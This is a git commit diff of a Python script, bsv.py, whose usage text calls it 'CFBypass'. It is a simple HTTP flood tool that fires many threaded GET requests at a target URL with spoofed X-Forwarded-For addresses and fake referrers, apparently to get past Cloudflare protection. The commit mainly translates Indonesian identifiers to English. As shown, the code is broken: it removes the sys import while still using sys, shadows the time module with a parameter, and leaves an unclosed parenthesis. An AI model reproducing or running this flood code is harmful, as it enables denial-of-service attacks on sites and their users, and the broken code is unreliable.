771426209687d6e3f7a3037c10a34cd2e2997af2
baimdevelop <baimstore116@gmail.com>
2024-07-01 12:48:32 +0700

    Update bsv.py

--- bsv.py
+++ bsv.py
@@ -3,7 +3,6 @@ import random
 import time
 import threading
 import os
-import sys
 
 def random_string(length):
     characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
@@ -12,12 +11,12 @@ def random_string(length):
 def random_ip():
     return f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
 
-def main(url, waktu):
+def main(url, time):
     if len(sys.argv) <= 2:
-        print("Penggunaan: python bsv.py <url> <waktu>")
+        print("Usage: python CFBypass.py <url> <time>")
         sys.exit(-1)
 
-    def kirim_pengiriman():
+    def send_request():
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
@@ -27,18 +26,19 @@ def main(url, waktu):
             'Referrer': f"http://google.com/{random_string(10)}",
             'X-Forwarded-For': random_ip()
         }
-        requests.get(url, headers=headers)
+        response = requests.get(url, headers=headers)
+        print(response.status_code)
 
-    benangs = []
-    for _ in range(int(waktu)):
-        benang = threading.Thread(target=kirim_pengiriman)
-        benang.start()
-        benangs.append(benang)
+    threads = []
+    for _ in range(int(time)):
+        thread = threading.Thread(target=send_request)
+        thread.start()
+        threads.append(thread)
 
-    for benang in benangs:
-        benang.join()
+    for thread in threads:
+        thread.join()
 
-    print("CFBypass selesai.")
+    print("CFBypass completed.")
 
 if __name__ == "__main__":
-    main(sys.argv[1], sys.argv[2])
+    main(sys.argv[1], sys.argv[2]
